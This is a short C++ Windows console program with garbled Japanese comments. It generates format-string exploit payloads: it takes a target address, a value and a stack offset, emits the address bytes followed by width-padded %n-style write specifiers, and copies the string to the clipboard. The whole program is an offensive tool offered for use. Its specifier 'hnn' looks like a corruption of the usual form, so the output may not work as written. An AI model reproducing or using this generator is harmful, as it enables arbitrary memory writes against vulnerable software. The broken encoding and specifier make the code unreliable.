// ConsoleApplication5.cpp : �R���\�[�� �A�v���P�[�V�����̃G���g�� �|�C���g���`���܂��B
//
#include "stdafx.h"
#include <windows.h>
#pragma warning(disable:4996)

/*�R�s�y*/
BOOL SetClipboardText(const char *Str)
{
	int    BufSize;
	char  *Buf;
	HANDLE hMem;

	BufSize = strlen(Str) + 1;                               // �m�ۂ��郁�����̃T�C�Y���v�Z����
	hMem = GlobalAlloc(GMEM_SHARE | GMEM_MOVEABLE, BufSize); // �ړ��\�ȋ��L���������m�ۂ���
	if (!hMem) return FALSE;

	Buf = (char *)GlobalLock(hMem); // �m�ۂ��������������b�N���C�A�N�Z�X�\�ɂ���
	if (Buf)
	{
		strcpy(Buf, Str);   // ������𕡎ʂ���
		GlobalUnlock(hMem); // �������̃��b�N����������
		if (OpenClipboard(NULL))
		{
			EmptyClipboard();                  // �N���b�v�{�[�h���̌Â��f�[�^���������
			SetClipboardData(CF_TEXT, hMem); // �N���b�v�{�[�h�ɐV�����f�[�^����͂���
			CloseClipboard();

			return TRUE;
		}
	}
	return FALSE;
}

void main()
{
	while (TRUE){
		int d, x, f;
		int p, rest, size = 0;
		char buf[256] = "", str[256] = "";
		printf("\n�������ݐ�@�������ޒl �����I�t�Z�b�g\n");
		scanf("%p%p%p", &d, &x, &f);
		for (int c = 0; 4 > c; c++){
			for (int i = 0; 4 > i; i++){
				sprintf(str, "\\x%02x", *(byte*)((DWORD)&d + i));
				strcat(buf, str);
			}
			d++;
		}
		for (int i = 0; 4 > i; i++, f++){
			if (!i)sprintf(str, "%%%dx%%%d$hnn", (*(byte*)((DWORD)&x + i) - 16), f);
			else sprintf(str, "%%%dx%%%d$hnn", *(byte*)((DWORD)&x + i) + 0x100 - *(byte*)((DWORD)&x + (i - 1)) - 1, f);
			strcat(buf, str);

		}
		SetClipboardText(buf);
		printf("%s", buf);
	}
}

